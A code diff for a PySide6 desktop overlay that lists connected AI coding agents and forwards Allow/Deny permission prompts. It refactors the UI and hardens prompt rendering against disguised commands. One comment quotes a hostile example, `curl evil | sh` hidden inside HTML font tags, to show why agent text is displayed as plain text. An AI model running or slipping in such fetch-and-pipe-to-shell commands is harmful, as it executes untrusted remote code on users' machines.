@@ -3,20 +3,19 @@
 On a MacBook with a camera notch the island anchors to the notch and stays
 visible across every Space and full-screen app. Everywhere else it floats at
 top-center. It shows every connected AI agent, forwards Allow/Deny approvals,
-and — for Dulus specifically — surfaces the active model and context usage.
+and surfaces each agent's model and context usage when it reports them.
 """
 
 from __future__ import annotations
 
 import os
+import shutil
 import subprocess
 import sys
 import time
 import webbrowser
-from dataclasses import dataclass, field
-from datetime import datetime
 from pathlib import Path
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Tuple
 
 from PySide6 import QtCore, QtGui, QtWidgets
 from PySide6.QtCore import Qt, QTimer, Signal
@@ -32,13 +31,18 @@ from PySide6.QtWidgets import (
     QWidget,
 )
 
-from . import native
-from .agents import detect_installed, is_dulus, style_for
-from .server import AgentEvent, AgentEventServer
+from . import autostart, native
+from . import protocol as P
+from .agents import detect_installed, style_for
+from .config import Settings
+from .integrations import python_console
+from .protocol import AgentEvent
+from .server import AgentEventServer
+from .state import Permission, Session, SessionStore, call_text, one_line
 
 APP_NAME = "Dulus Bar"
-WS_PORT = 17372
-DOCS_URL = "https://bitbucket.org/dulus-ai/dulus-bar"
+WS_PORT = P.DEFAULT_PORT
+DOCS_URL = "https://github.com/Dulus-Ai/Dulus-bar#readme"
 
 # --- palette --------------------------------------------------------------
 # Elevated surfaces sit clearly above any wallpaper OR a dark terminal behind.
@@ -48,6 +52,7 @@ PILL_BORDER = "#3a3a44"
 PILL_BORDER_HOVER = "#50505c"
 BG = "#151519"  # panel / toast surface
 BG_HOVER = "#212128"
+CODE_BG = "#0e0e12"
 BORDER = "#2c2c34"
 BORDER_HOVER = "#3a3a44"
 TEXT = "#f4f4f5"
@@ -60,19 +65,24 @@ BAD = "#f87171"
 IDLE = "#71717a"
 
 ROW_HEIGHT = 46
+PANEL_WIDTH = 360
+ROW_TEXT_PX = PANEL_WIDTH - 104  # panel/row margins, status dot, dismiss button
+PILL_META_PX = 190
+TOAST_WIDTH = 420
 
 # --- notch-style auto-hide (Qt overlay: Windows / Linux) ------------------
 # Mirrors the macOS notch surface: the island rests as a slim "peek" tab flush
-# with the top edge and reveals on hover over the top-center zone, on agent
-# activity (briefly), or on a permission request (staying open until answered).
-# Disable with DULUS_BAR_NO_AUTOHIDE=1 to keep the classic always-visible pill.
+# with the top edge and reveals on hover over the top-center zone, when an
+# agent finishes or fails (briefly), or on a permission request (staying open
+# until answered). Turn it off from the menu, or with DULUS_BAR_NO_AUTOHIDE=1.
 PEEK_WIDTH = 132
 PEEK_HEIGHT = 6
 HOT_ZONE_HEIGHT = 10   # px below the top edge that counts as "hovering the notch"
 HOT_ZONE_PAD = 16      # px of horizontal slack on each side of the island
 HOVER_DWELL_MS = 350   # ms of intentional hover required before expanding
-BRIEF_REVEAL_MS = 2600  # how long agent activity peeks the island open
+BRIEF_REVEAL_MS = 2600  # how long a finished / failed agent peeks the island open
 TOP_MARGIN = 8         # gap between the screen/work-area top and the pill
+NOTIFY_COOLDOWN_S = 8.0  # per session, so a chatty agent can't spam the desktop
 
 STATUS_COLORS = {
     "running": GOOD,
@@ -84,35 +94,15 @@ STATUS_COLORS = {
 
 # Native default font family; replaced at runtime by native.default_font_family().
 FONT_FAMILY = "Segoe UI"
+MONO_FAMILY = "monospace"
 
-
-@dataclass
-class Session:
-    """A running agent session as tracked by the overlay."""
-
-    agent: str
-    session_id: str
-    status: str = "idle"  # idle, running, waiting, done, error
-    message: str = ""
-    started: datetime = field(default_factory=datetime.now)
-    last_seen: datetime = field(default_factory=datetime.now)
-    pid: Optional[int] = None
-    terminal_hint: str = ""
-    model: str = ""  # Dulus only
-    ctx: str = ""  # Dulus only, e.g. "38%" or "12k/200k"
-
-    def __hash__(self) -> int:
-        return hash((self.agent, self.session_id))
-
-    def __eq__(self, other: object) -> bool:
-        return isinstance(other, Session) and (self.agent, self.session_id) == (
-            other.agent,
-            other.session_id,
-        )
+_TRUTHY = ("1", "true", "True", "yes")
 
 
 def _ctx_color(ctx: str) -> str:
-    """Green/amber/red based on the leading percentage in a ctx string."""
+    """Green/amber/red for a percentage ("38%"); neutral for token counts."""
+    if "%" not in ctx:
+        return TEXT_DIM
     digits = ""
     for ch in ctx:
         if ch.isdigit():
@@ -130,31 +120,42 @@ def _ctx_color(ctx: str) -> str:
 
 
 def _esc(text: str) -> str:
-    """Minimal HTML escape for the RichText toast title."""
+    """Minimal HTML escape for RichText labels."""
     return (text or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 
 def _elide(text: str, limit: int = 88) -> str:
-    """Collapse newlines/whitespace to a single line and truncate with an
-    ellipsis — keeps a long, minified tool call to one clean, readable row
-    instead of the messy multi-line wrap it used to become."""
+    """One clean, truncated line — a long minified tool call never wraps."""
+    return one_line(text, limit)
+
+
+def _ago(seconds: float) -> str:
+    seconds = max(0, int(seconds))
+    if seconds < 60:
+        return f"{seconds}s"
+    if seconds < 3600:
+        return f"{seconds // 60}m"
+    return f"{seconds // 3600}h"
+
+
+def _meta_plain(session: Session) -> str:
+    return " · ".join(x for x in (session.model, f"ctx {session.ctx}" if session.ctx else "") if x)
+
+
+def _meta_html(session: Session, accent: str) -> str:
+    """``model · ctx`` for agents that report them (Dulus, Claude Code…)."""
+    bits = []
+    if session.model:
+        bits.append(f"<span style='color:{accent};'>{_esc(session.model)}</span>")
+    if session.ctx:
+        bits.append(f"<span style='color:{_ctx_color(session.ctx)};'>ctx {_esc(session.ctx)}</span>")
+    return " · ".join(bits)
+
+
+def _fit(text: str, font: QFont, pixels: int) -> str:
+    """Elide ``text`` to what really fits in ``pixels`` with ``font``."""
     flat = " ".join((text or "").split())
-    return flat if len(flat) <= limit else flat[: limit - 1].rstrip() + "…"
-
-
-def _permission_call_text(tool: str, args: str) -> str:
-    """Build ONE clean representation of a tool call. Guards against a client
-    that stuffs (almost) the same string into both `tool` and `args` — so the
-    same call is never rendered twice."""
-    tool = (tool or "").strip()
-    args = (args or "").strip()
-    if not args:
-        return tool or "Run a tool?"
-    if not tool:
-        return args
-    if tool in args or args in tool:  # redundant → keep the fuller one
-        return args if len(args) >= len(tool) else tool
-    return f"{tool}  {args}"
+    return QtGui.QFontMetrics(font).elidedText(flat, Qt.TextElideMode.ElideRight, max(24, pixels))
 
 
 class PillButton(QPushButton):
@@ -192,10 +193,82 @@ class PillButton(QPushButton):
         )
 
 
-class SessionRow(QWidget):
-    """One agent row inside the expanded panel."""
+class StatusDot(QWidget):
+    """Status dot; live states send out a soft ripple, like a heartbeat.
 
-    clicked = Signal(Session)
+    ~30 fps from a plain timer, only while visible, and only for the states
+    in ``pulse_for``: the pill sits under a blurred shadow that every repaint
+    re-renders, so it pulses just while something waits for you.
+    """
+
+    FRAME_MS = 33
+
+    def __init__(self, parent: Optional[QWidget] = None, size: int = 12,
+                 pulse_for: Tuple[str, ...] = ("running", "waiting")):
+        super().__init__(parent)
+        self.setFixedSize(size, size)
+        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
+        self._pulse_for = pulse_for
+        self._color = QColor(IDLE)
+        self._status = ""
+        self._phase = 0.0
+        self._period = 1.8
+        self._timer = QTimer(self)
+        self._timer.setInterval(self.FRAME_MS)
+        self._timer.timeout.connect(self._tick)
+
+    @property
+    def _live(self) -> bool:
+        return self._status in self._pulse_for
+
+    def set_status(self, status: str) -> None:
+        if status == self._status:
+            return
+        self._status = status
+        self._color = QColor(STATUS_COLORS.get(status, IDLE))
+        self._period = 1.0 if status == "waiting" else 1.8
+        if self._live and self.isVisible():
+            self._timer.start()
+        elif not self._live:
+            self._timer.stop()
+            self._phase = 0.0
+        self.update()
+
+    def showEvent(self, event: QtGui.QShowEvent) -> None:
+        super().showEvent(event)
+        if self._live:
+            self._timer.start()
+
+    def hideEvent(self, event: QtGui.QHideEvent) -> None:
+        super().hideEvent(event)
+        self._timer.stop()  # no ticking while nobody can see it
+
+    def _tick(self) -> None:
+        t = (time.monotonic() % self._period) / self._period
+        self._phase = 1.0 - (1.0 - t) ** 3  # ease-out: a quick burst that settles
+        self.update()
+
+    def paintEvent(self, event: QtGui.QPaintEvent) -> None:
+        painter = QtGui.QPainter(self)
+        painter.setRenderHint(QtGui.QPainter.RenderHint.Antialiasing)
+        painter.setPen(Qt.PenStyle.NoPen)
+        center = QtCore.QPointF(self.width() / 2, self.height() / 2)
+        core = min(self.width(), self.height()) * 0.29
+        if self._live:
+            ring = QColor(self._color)
+            ring.setAlphaF(0.55 * (1.0 - self._phase))
+            painter.setBrush(ring)
+            radius = core + (min(self.width(), self.height()) / 2 - core) * self._phase
+            painter.drawEllipse(center, radius, radius)
+        painter.setBrush(self._color)
+        painter.drawEllipse(center, core, core)
+
+
+class SessionRow(QWidget):
+    """One agent row inside the expanded panel, updated in place."""
+
+    clicked = Signal(object)    # Session
+    dismissed = Signal(object)  # Session
 
     def __init__(self, session: Session, parent: Optional[QWidget] = None):
         super().__init__(parent)
@@ -211,13 +284,10 @@ class SessionRow(QWidget):
         )
 
         root = QHBoxLayout(self)
-        root.setContentsMargins(10, 4, 12, 4)
+        root.setContentsMargins(10, 4, 8, 4)
         root.setSpacing(10)
 
-        self.dot = QLabel("●")
-        self.dot.setFixedWidth(12)
-        self.dot.setFont(QFont(FONT_FAMILY, 9))
-        self.dot.setStyleSheet(f"color: {STATUS_COLORS.get(session.status, IDLE)};")
+        self.dot = StatusDot(self)
         root.addWidget(self.dot, 0, Qt.AlignmentFlag.AlignVCenter)
 
         text_col = QVBoxLayout()
@@ -230,46 +300,71 @@ class SessionRow(QWidget):
         self.icon = QLabel(self.style_.emoji)
         self.icon.setFont(QFont(FONT_FAMILY, 11))
         top.addWidget(self.icon)
-        self.name = QLabel(self.style_.display)
+        self.name = QLabel()
         self.name.setFont(QFont(FONT_FAMILY, 11, QFont.Weight.DemiBold))
+        self.name.setTextFormat(Qt.TextFormat.RichText)
         self.name.setStyleSheet(f"color: {TEXT};")
         top.addWidget(self.name)
         top.addStretch()
-        self.time = QLabel(self._fmt_time(session.last_seen))
+        self.time = QLabel()
         self.time.setFont(QFont(FONT_FAMILY, 9))
         self.time.setStyleSheet(f"color: {TEXT_FAINT};")
         top.addWidget(self.time)
         text_col.addLayout(top)
 
-        self.sub = QLabel(self._subtitle(session))
+        self.sub = QLabel()
         self.sub.setFont(QFont(FONT_FAMILY, 9))
         self.sub.setStyleSheet(f"color: {TEXT_DIM};")
         self.sub.setTextFormat(Qt.TextFormat.RichText)
         text_col.addWidget(self.sub)
-
         root.addLayout(text_col, 1)
 
-    def _fmt_time(self, dt: datetime) -> str:
-        elapsed = (datetime.now() - dt).total_seconds()
-        if elapsed < 60:
-            return f"{int(elapsed)}s"
-        if elapsed < 3600:
-            return f"{int(elapsed // 60)}m"
-        return f"{int(elapsed // 3600)}h"
+        self.close_btn = QPushButton("×", self)
+        self.close_btn.setFixedSize(18, 18)
+        self.close_btn.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.close_btn.setToolTip("Dismiss")
+        self.close_btn.setStyleSheet(
+            f"QPushButton {{ color: {TEXT_FAINT}; background: transparent; border: none;"
+            f" font-size: 14px; border-radius: 9px; }}"
+            f"QPushButton:hover {{ color: {TEXT}; background: {BORDER}; }}"
+        )
+        self.close_btn.clicked.connect(lambda: self.dismissed.emit(self.session))
+        self.close_btn.setVisible(False)
+        root.addWidget(self.close_btn, 0, Qt.AlignmentFlag.AlignVCenter)
+
+        self.update_session(session)
+
+    def update_session(self, session: Session) -> None:
+        self.session = session
+        self.dot.set_status(session.status)
+        self.time.setText(_ago(time.time() - session.status_since))
+        name_font = self.name.font()
+        room = ROW_TEXT_PX - 36 - QtGui.QFontMetrics(name_font).horizontalAdvance(self.style_.display + "  ")
+        title = ""
+        if session.title and room > 30:
+            faint = QFont(name_font)
+            faint.setWeight(QFont.Weight.Normal)
+            title = (f"&nbsp;<span style='color:{TEXT_FAINT}; font-weight:400;'>"
+                     f"{_esc(_fit(session.title, faint, room))}</span>")
+        self.name.setText(f"{_esc(self.style_.display)}{title}")
+        self.sub.setText(self._subtitle(session))
 
     def _subtitle(self, session: Session) -> str:
-        msg = (session.message or session.status).strip()
-        if is_dulus(session.agent) and (session.model or session.ctx):
-            bits = []
-            if session.model:
-                bits.append(f"<span style='color:{self.style_.accent};'>{session.model}</span>")
-            if session.ctx:
-                bits.append(f"<span style='color:{_ctx_color(session.ctx)};'>ctx {session.ctx}</span>")
-            prefix = " · ".join(bits)
-            if msg:
-                return f"{prefix} · <span style='color:{TEXT_FAINT};'>{msg[:48]}</span>"
-            return prefix
-        return f"<span style='color:{TEXT_DIM};'>{msg[:60]}</span>"
+        font = self.sub.font()
+        plain = _meta_plain(session)
+        room = ROW_TEXT_PX - (QtGui.QFontMetrics(font).horizontalAdvance(plain + " · ") if plain else 0)
+        msg = _esc(_fit(session.message or session.status, font, room))
+        meta = _meta_html(session, self.style_.accent)
+        if meta:
+            return f"{meta} · <span style='color:{TEXT_FAINT};'>{msg}</span>" if msg else meta
+        return f"<span style='color:{TEXT_DIM};'>{msg}</span>"
+
+    def enterEvent(self, event: QtCore.QEvent) -> None:
+        # Live sessions can't be dismissed — they'd just come right back.
+        self.close_btn.setVisible(self.session.status not in ("running", "waiting"))
+
+    def leaveEvent(self, event: QtCore.QEvent) -> None:
+        self.close_btn.setVisible(False)
 
     def mousePressEvent(self, a0: Optional[QtGui.QMouseEvent]) -> None:
         self.clicked.emit(self.session)
@@ -319,29 +414,35 @@ class DulusBarOverlay(QMainWindow):
     """Top-center / notch-anchored floating island."""
 
     event_received = Signal(AgentEvent)
-    permission_decision = Signal(str, str, bool)  # agent, session_id, approved
+    shutdown_requested = Signal()
 
-    def __init__(self, server: AgentEventServer):
+    def __init__(self, server: AgentEventServer, settings: Optional[Settings] = None):
         super().__init__()
         self.server = server
+        self.settings = settings or Settings()
+        self.store = SessionStore()
+        self.tray: Optional["TrayApp"] = None
         self.server.on_event(self._on_agent_event)
+        self.server.on_shutdown(self.shutdown_requested.emit)
         self.event_received.connect(self._handle_event, Qt.ConnectionType.QueuedConnection)  # type: ignore[call-arg]
-        self.permission_decision.connect(self._broadcast_decision, Qt.ConnectionType.QueuedConnection)  # type: ignore[call-arg]
+        self.shutdown_requested.connect(self.quit_app, Qt.ConnectionType.QueuedConnection)  # type: ignore[call-arg]
 
-        self.sessions: Dict[tuple, Session] = {}
-        self.pending_permissions: List[AgentEvent] = []
+        self._quitting = False
         self.expanded = False
         self.toast_visible = False
-        self.current_permission: Optional[AgentEvent] = None
+        self.current_permission: Optional[Permission] = None
         self._configured_native = False
+        self._rows: Dict[Tuple[str, str], SessionRow] = {}
+        self._last_notified: Dict[Tuple[str, str], float] = {}
 
         # Notch-style auto-hide. On by default (Windows/Linux Qt overlay); the
         # native macOS surface handles its own notch behaviour separately.
-        self._autohide = os.environ.get("DULUS_BAR_NO_AUTOHIDE") not in ("1", "true", "True")
-        if self._autohide and not QtWidgets.QSystemTrayIcon.isSystemTrayAvailable():
+        self._autohide_forced_off = os.environ.get("DULUS_BAR_NO_AUTOHIDE") in _TRUTHY
+        if not QtWidgets.QSystemTrayIcon.isSystemTrayAvailable():
             # No status area (plain GNOME, bare WMs…): the tray menu is not a way
             # back, so tucking the island out of sight could strand the user.
-            self._autohide = False
+            self._autohide_forced_off = True
+        self._autohide = bool(self.settings["autohide"]) and not self._autohide_forced_off
         self.revealed = not self._autohide  # tucked to a peek until hovered
         self.permission_pinned = False      # stay revealed while a prompt is open
         self._reveal_until = 0.0            # monotonic deadline for a brief peek
@@ -357,13 +458,14 @@ class DulusBarOverlay(QMainWindow):
         # Escape hatch for window managers without a compositor (bare i3/openbox
         # with no picom): a translucent window there paints solid black around
         # the pill, so DULUS_BAR_OPAQUE=1 drops translucency and the shadows.
-        self._opaque = os.environ.get("DULUS_BAR_OPAQUE") in ("1", "true", "True")
+        self._opaque = os.environ.get("DULUS_BAR_OPAQUE") in _TRUTHY
 
         self._init_window()
         self._init_ui()
         self._reposition()
         self._init_refresh_timer()
         self._init_hover_timer()
+        self._watch_screens()
         self._apply_geometry()  # start tucked (or correctly sized when always-on)
 
     # --- setup ----------------------------------------------------------
@@ -387,6 +489,7 @@ class DulusBarOverlay(QMainWindow):
         self.setWindowFlags(self._overlay_flags())
         self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, not self._opaque)
         self.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents, False)
+        self.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating, True)  # never steal focus
         self.setFixedHeight(58)
 
     def _init_ui(self) -> None:
@@ -406,17 +509,26 @@ class DulusBarOverlay(QMainWindow):
         pill_row.setSpacing(8)
 
         self.icon_label = QLabel()
-        self.icon_label.setFont(QFont(FONT_FAMILY, 13))
+        self.icon_label.setFont(QFont(FONT_FAMILY, 12))
+        # A fixed, centred box: colour-emoji glyphs carry odd metrics and used
+        # to sit high and clip against the pill's edge.
+        self.icon_label.setFixedSize(22, 22)
+        self.icon_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
         self._bird_pixmap = self._load_bird_pixmap(20)
         self._apply_pill_icon(None)  # brand bird by default
         pill_row.addWidget(self.icon_label)
 
+        self.pill_dot = StatusDot(self.pill, size=10, pulse_for=("waiting",))
+        self.pill_dot.setVisible(False)
+        pill_row.addWidget(self.pill_dot)
+
         self.status_label = QLabel(APP_NAME)
+        self.status_label.setTextFormat(Qt.TextFormat.PlainText)  # agent names are untrusted
         self.status_label.setFont(QFont(FONT_FAMILY, 11, QFont.Weight.DemiBold))
         self.status_label.setStyleSheet(f"color: {TEXT};")
         pill_row.addWidget(self.status_label)
 
-        self.meta_label = QLabel("")  # model / ctx (Dulus) or short status
+        self.meta_label = QLabel("")  # model / ctx, or a short status
         self.meta_label.setFont(QFont(FONT_FAMILY, 9))
         self.meta_label.setTextFormat(Qt.TextFormat.RichText)
         self.meta_label.setStyleSheet(f"color: {TEXT_DIM};")
@@ -428,7 +540,7 @@ class DulusBarOverlay(QMainWindow):
         self.count_badge.setFont(QFont(FONT_FAMILY, 9, QFont.Weight.Bold))
         self.count_badge.setAlignment(Qt.AlignmentFlag.AlignCenter)
         self.count_badge.setFixedSize(20, 20)
-        self.count_badge.setStyleSheet(f"color: #08080a; background: {GOOD}; border-radius: 10px;")
+        self._style_badge(GOOD)
         self.count_badge.setVisible(False)
         pill_row.addWidget(self.count_badge)
 
@@ -438,20 +550,36 @@ class DulusBarOverlay(QMainWindow):
         self.panel.setStyleSheet(
             f"#panel {{ background-color: {BG}; border: 1px solid {BORDER}; border-radius: 18px; }}"
         )
-        self.panel.setFixedWidth(340)
+        self.panel.setFixedWidth(PANEL_WIDTH - 20)
         self.panel.setVisible(False)
         self.panel_layout = QVBoxLayout(self.panel)
         self.panel_layout.setContentsMargins(12, 12, 12, 12)
         self.panel_layout.setSpacing(4)
 
+        header_row = QHBoxLayout()
+        header_row.setContentsMargins(0, 0, 0, 0)
         header = QLabel("ACTIVE AGENTS")
         header.setFont(QFont(FONT_FAMILY, 8, QFont.Weight.Bold))
         header.setStyleSheet(f"color: {TEXT_FAINT}; letter-spacing: 1.5px;")
-        self.panel_layout.addWidget(header)
+        header_row.addWidget(header)
+        header_row.addStretch()
+        self.clear_btn = QPushButton("Clear finished")
+        self.clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.clear_btn.setFont(QFont(FONT_FAMILY, 8, QFont.Weight.DemiBold))
+        self.clear_btn.setStyleSheet(
+            f"QPushButton {{ color: {TEXT_FAINT}; background: transparent; border: none; padding: 0; }}"
+            f"QPushButton:hover {{ color: {TEXT}; }}"
+        )
+        self.clear_btn.clicked.connect(self._clear_finished)
+        self.clear_btn.setVisible(False)
+        header_row.addWidget(self.clear_btn)
+        self.panel_layout.addLayout(header_row)
 
-        self.empty_label = QLabel("No agents connected yet.")
+        self.empty_label = QLabel()
         self.empty_label.setFont(QFont(FONT_FAMILY, 10))
-        self.empty_label.setStyleSheet(f"color: {TEXT_FAINT}; padding: 12px 4px;")
+        self.empty_label.setWordWrap(True)
+        self.empty_label.setTextFormat(Qt.TextFormat.RichText)
+        self.empty_label.setStyleSheet(f"color: {TEXT_FAINT}; padding: 8px 4px;")
         self.panel_layout.addWidget(self.empty_label)
 
         self.sessions_container = QVBoxLayout()
@@ -490,6 +618,12 @@ class DulusBarOverlay(QMainWindow):
         if not self._opaque:
             self.pill.setGraphicsEffect(shadow)
 
+    def _style_badge(self, color: str) -> None:
+        if color == getattr(self, "_badge_color", None):
+            return
+        self._badge_color = color
+        self.count_badge.setStyleSheet(f"color: #08080a; background: {color}; border-radius: 10px;")
+
     def _build_toast(self) -> None:
         # Top-level window, NOT a child of the island. A child is clipped to the
         # tiny island window and never shows — which is why Allow/Deny was
@@ -504,7 +638,8 @@ class DulusBarOverlay(QMainWindow):
         # desktop). A normal child widget with WA_StyledBackground ALWAYS paints
         # its background — the same approach the expanded panel uses.
         self.toast.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, not self._opaque)
-        self.toast.setFixedSize(388, 132)
+        self.toast.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating, True)
+        self.toast.setFixedWidth(TOAST_WIDTH)
         self.toast.setVisible(False)
 
         outer = QVBoxLayout(self.toast)
@@ -518,24 +653,48 @@ class DulusBarOverlay(QMainWindow):
             f" border-radius: 18px; }}"
         )
         outer.addWidget(card)
+        self.toast_card = card
 
         t = QVBoxLayout(card)
         t.setContentsMargins(16, 12, 16, 12)
         t.setSpacing(6)
 
+        head = QHBoxLayout()
+        head.setSpacing(8)
         self.toast_title = QLabel("Permission request")
         self.toast_title.setFont(QFont(FONT_FAMILY, 11))
         self.toast_title.setTextFormat(Qt.TextFormat.RichText)
         self.toast_title.setStyleSheet(f"color: {TEXT}; background: transparent;")
-        t.addWidget(self.toast_title)
+        head.addWidget(self.toast_title, 1)
+        self.toast_counter = QLabel("")
+        self.toast_counter.setFont(QFont(FONT_FAMILY, 8, QFont.Weight.Bold))
+        self.toast_counter.setStyleSheet(
+            f"color: #08080a; background: {WARN}; border-radius: 8px; padding: 1px 7px;"
+        )
+        self.toast_counter.setVisible(False)
+        head.addWidget(self.toast_counter, 0, Qt.AlignmentFlag.AlignTop)
+        t.addLayout(head)
 
+        # Agent-supplied text is PLAIN text, always. As rich text, a command
+        # like `true <font color=…>; curl evil | sh;</font> ls` would *show* as
+        # `true ; ls` — and get approved.
         self.toast_body = QLabel("")
-        self.toast_body.setFont(QFont(FONT_FAMILY, 9))
+        self.toast_body.setTextFormat(Qt.TextFormat.PlainText)
+        self.toast_body.setFont(QFont(FONT_FAMILY, 10, QFont.Weight.DemiBold))
         self.toast_body.setStyleSheet(f"color: {TEXT_DIM}; background: transparent;")
         self.toast_body.setWordWrap(True)
         t.addWidget(self.toast_body)
 
-        t.addStretch(1)  # pin the buttons to the bottom, whatever the body height
+        self.toast_code = QLabel("")
+        self.toast_code.setTextFormat(Qt.TextFormat.PlainText)
+        self.toast_code.setFont(QFont(MONO_FAMILY, 9))
+        self.toast_code.setWordWrap(False)  # hard-wrapped ourselves: see _wrap_code
+        self.toast_code.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
+        self.toast_code.setStyleSheet(
+            f"color: {TEXT}; background: {CODE_BG}; border: 1px solid {BORDER};"
+            f" border-radius: 9px; padding: 7px 9px;"
+        )
+        t.addWidget(self.toast_code)
 
         btns = QHBoxLayout()
         btns.setSpacing(8)
@@ -543,13 +702,18 @@ class DulusBarOverlay(QMainWindow):
         # macOS-style hierarchy: Allow is the light primary, Deny the dark
         # secondary — calmer and clearer than the old red/green pair.
         self.deny_btn = PillButton("Deny", "#2b2b33", fg=TEXT, border=BORDER_HOVER)
+        self.always_btn = PillButton("Always allow", "#2b2b33", fg=TEXT, border=BORDER_HOVER)
         self.allow_btn = PillButton("Allow", "#f5f5f6", fg="#08080a")
         btns.addWidget(self.deny_btn)
+        btns.addWidget(self.always_btn)
         btns.addWidget(self.allow_btn)
         t.addLayout(btns)
 
         self.deny_btn.clicked.connect(lambda: self._resolve_permission(False))
+        self.always_btn.clicked.connect(lambda: self._resolve_permission(True, always=True))
         self.allow_btn.clicked.connect(lambda: self._resolve_permission(True))
+        # Deliberately mouse-only, and never activated on show: a card that
+        # grabbed focus could turn the Enter you were typing into an "Allow".
 
         toast_shadow = QGraphicsDropShadowEffect(card)
         toast_shadow.setBlurRadius(24)
@@ -562,6 +726,23 @@ class DulusBarOverlay(QMainWindow):
         self.timer = QTimer(self)
         self.timer.timeout.connect(self._refresh_ui)
         self.timer.start(1000)
+
+    def _watch_screens(self) -> None:
+        """Follow monitor changes: plug/unplug, resolution, panel moves."""
+        app = QApplication.instance()
+        if isinstance(app, QtGui.QGuiApplication):
+            app.primaryScreenChanged.connect(lambda _screen: self._on_screen_changed())
+            app.screenAdded.connect(lambda _screen: self._on_screen_changed())
+            app.screenRemoved.connect(lambda _screen: self._on_screen_changed())
+        screen = QApplication.primaryScreen()
+        if screen is not None:
+            screen.geometryChanged.connect(lambda _rect: self._on_screen_changed())
+            screen.availableGeometryChanged.connect(lambda _rect: self._on_screen_changed())
+
+    def _on_screen_changed(self) -> None:
+        self._reposition()
+        self._settle_position()
+        self._position_toast()
 
     # --- positioning (notch-aware) --------------------------------------
     def _screen_rect(self) -> QtCore.QRect:
@@ -623,143 +804,129 @@ class DulusBarOverlay(QMainWindow):
 
     # --- server plumbing ------------------------------------------------
     def _on_agent_event(self, event: AgentEvent) -> None:
+        # Hub thread -> Qt thread.
         self.event_received.emit(event)
 
-    def _broadcast_decision(self, agent: str, session_id: str, approved: bool) -> None:
-        self.server.broadcast(
-            {
-                "agent": agent,
-                "type": "decision",
-                "session_id": session_id,
-                "payload": {"approved": approved},
-            }
-        )
-
     def _handle_event(self, event: AgentEvent) -> None:
-        # Ignore health pings / system probes — they are NOT agents.
-        if event.event_type in ("ping", "health", "pong"):
-            return
-        if event.agent in ("_health", "VibeHealth", "DulusHealth", "health", ""):
-            return
-        if event.session_id in ("_health", "health"):
-            return
-
         key = (event.agent, event.session_id)
-        now = datetime.now()
-        payload = event.payload or {}
+        before = self.store.sessions.get(key)
+        old_status = before.status if before else None
+        self.store.apply(event)
+        session = self.store.sessions.get(key)
 
-        if event.event_type == "disconnected":
-            # The wrapper's socket dropped — remove its session right away so a
-            # close+reopen doesn't leave a duplicate ghost in the list.
-            if self.sessions.pop(key, None) is not None:
-                self._refresh_ui()
-            return
-
-        if event.event_type == "session_started":
-            self.sessions[key] = Session(
-                agent=event.agent,
-                session_id=event.session_id,
-                status="running",
-                message="started",
-                started=now,
-                last_seen=now,
-                pid=payload.get("pid"),
-                terminal_hint=payload.get("terminal_hint", ""),
-                model=payload.get("model", ""),
-                ctx=payload.get("ctx", ""),
-            )
-        elif key in self.sessions:
-            session = self.sessions[key]
-            session.last_seen = now
-            if payload.get("model"):
-                session.model = payload["model"]
-            if payload.get("ctx"):
-                session.ctx = payload["ctx"]
-            if event.event_type == "message":
-                session.message = str(payload.get("text", ""))[:80]
-                session.status = "running"
-            elif event.event_type == "tool_request":
-                session.status = "waiting"
-                session.message = payload.get("tool", "permission request")
-                self._show_permission(event)
-            elif event.event_type == "tool_approved":
-                session.status = "running"
-                session.message = "approved"
-            elif event.event_type == "tool_denied":
-                session.status = "running"
-                session.message = "denied"
-            elif event.event_type == "completed":
-                session.status = "done"
-                session.message = "done"
-            elif event.event_type == "error":
-                session.status = "error"
-                session.message = str(payload.get("text", "error"))
-        else:
-            self.sessions[key] = Session(
-                agent=event.agent,
-                session_id=event.session_id,
-                status="running",
-                message=str(payload.get("text", "")),
-                last_seen=now,
-                model=payload.get("model", ""),
-                ctx=payload.get("ctx", ""),
-            )
-
-        # Agent activity peeks the island open briefly (permission requests pin
-        # it open via _show_permission, so don't override that here).
-        if event.event_type != "tool_request":
-            self._reveal(brief=True)
+        if event.event_type == P.TOOL_REQUEST:
+            perm = self.store.find_permission(event.request_id) if event.request_id else None
+            if perm is not None:
+                self._notify_permission(perm)
+            # A permission request forces the island fully open and pins it
+            # there until it's answered — same as the macOS notch surface.
+            self._reveal(pin=True)
+        elif session is not None and session.status != old_status:
+            # Peek open when something *changes* — a finished or failed agent —
+            # not on every tool call (agents with hooks report dozens a minute).
+            if session.status in ("done", "error") or event.event_type == P.SESSION_STARTED:
+                if self.settings["reveal_on_activity"] and not self.settings["do_not_disturb"]:
+                    self._reveal(brief=True)
+                if session.status in ("done", "error"):
+                    self._notify_finished(session)
+        self._sync_permission_card()
         self._refresh_ui()
 
     # --- permissions ----------------------------------------------------
-    def _show_permission(self, event: AgentEvent) -> None:
-        self.pending_permissions.append(event)
-        # A permission request forces the island fully open and pins it there
-        # until the user answers — same as the macOS notch surface.
-        self._reveal(pin=True)
-        if not self.toast_visible:
-            self._render_next_permission()
-
-    def _render_next_permission(self) -> None:
-        if not self.pending_permissions:
-            self.toast.setVisible(False)
+    def _sync_permission_card(self) -> None:
+        """Show the head of the request queue, or hide the card."""
+        perm = self.store.current_permission()
+        if perm is None:
+            if self.toast_visible:
+                self.toast.setVisible(False)
             self.toast_visible = False
             self.current_permission = None
             self.permission_pinned = False  # free the island to tuck again
             return
+        self.permission_pinned = True
+        if (
+            self.current_permission is not None
+            and perm.request_id == self.current_permission.request_id
+            and self.toast_visible
+        ):
+            self._update_counter()
+            return
+        self.current_permission = perm
+        self._render_permission(perm)
 
-        event = self.pending_permissions[0]
-        self.current_permission = event
-        st = style_for(event.agent)
-        payload = event.payload or {}
-        # Title mirrors the macOS surface: agent name + model, falling back to a
-        # faint "needs approval" when the model isn't known yet.
-        sess = self.sessions.get((event.agent, event.session_id))
